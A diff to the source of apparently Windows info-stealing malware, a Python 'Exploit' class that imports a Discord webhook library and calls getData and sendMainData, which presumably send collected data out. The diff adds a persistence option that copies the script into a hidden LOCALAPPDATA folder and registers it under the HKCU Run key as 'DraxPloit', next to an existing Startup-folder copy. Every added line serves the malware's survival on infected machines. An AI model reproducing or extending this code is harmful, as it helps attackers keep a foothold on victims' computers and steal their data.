@@ -7,6 +7,8 @@ import subprocess
 import re
 import ctypes
 import zipfile
+import winreg
+import sys
 
 from discord_webhook import DiscordWebhook,DiscordEmbed
 from typing import Union
@@ -242,13 +244,30 @@ class Exploit:
 if __name__ == "__main__" and platform.system() == "Windows":
     exploit = Exploit()
 
-    if exploit.startupexe == "yes":
+    if exploit.startupexe == "1":
         startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         fileName = os.path.split(argv[0])[1]
         if os.path.exists(startup_path + fileName):
             pass
         else:
             copy2(argv[0], startup_path)
+    if exploit.startupexe == "2":
+        script_path = os.path.abspath(sys.argv[0])
+        script_name = os.path.split(argv[0])[1]
+        localAppData = os.path.join(os.environ['LOCALAPPDATA'])
+
+        appDataFolder = os.path.join(localAppData, 'DraxTempG')
+
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
+
+        targetPath = localAppData + "\\DraxTempG\\" + script_name
+        winreg.SetValueEx(key, "DraxPloit", 0, winreg.REG_SZ, targetPath)
+
+        winreg.CloseKey(key)
+
+        if not os.path.exists(appDataFolder):
+            os.mkdir(appDataFolder)
+            shutil.copy2(script_path, appDataFolder)
 
     exploit.getData()
     exploit.sendMainData()
